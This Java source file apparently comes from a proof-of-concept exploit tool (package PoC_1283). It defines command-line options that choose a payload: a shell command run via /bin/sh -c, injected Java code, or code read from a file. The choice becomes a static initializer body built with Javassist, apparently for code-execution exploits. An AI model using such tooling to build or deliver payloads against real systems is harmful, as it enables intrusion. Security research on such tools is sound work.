package PoC_1283;

import picocli.CommandLine.Option;

import java.io.IOException;

/**
 * payload 输入：--cmd / --code / --code-file 三选一（picocli @ArgGroup exclusive 保证互斥）。
 */
public class Modes {

    @Option(names = "--cmd", description = "执行系统命令（默认 /bin/sh -c，Windows 请自行改 JavassistGen.execCmd）")
    public String cmd;

    @Option(names = "--code", description = "直接注入 Java 代码（字符串用双引号）")
    public String code;

    @Option(names = "--code-file", description = "从文件读入 Java 代码（复杂逻辑推荐）")
    public String codeFile;

    /** 当前生效的模式名；未指定时返回 null */
    public String mode() {
        if (cmd != null) return "cmd";
        if (code != null) return "code";
        if (codeFile != null) return "code-file";
        return null;
    }

    /** 解析为最终 static{} 方法体；未指定任何输入时用 defaultCmd 作为命令 */
    public String body(String defaultCmd) throws IOException {
        if (cmd != null) return JavassistGen.resolveBody("cmd", cmd);
        if (code != null) return JavassistGen.resolveBody("code", code);
        if (codeFile != null) return JavassistGen.resolveBody("code-file", codeFile);
        return JavassistGen.resolveBody("cmd", defaultCmd);
    }

    public static String bodyOrDefault(Modes m, String defaultCmd) throws IOException {
        return m == null ? JavassistGen.resolveBody("cmd", defaultCmd) : m.body(defaultCmd);
    }
}
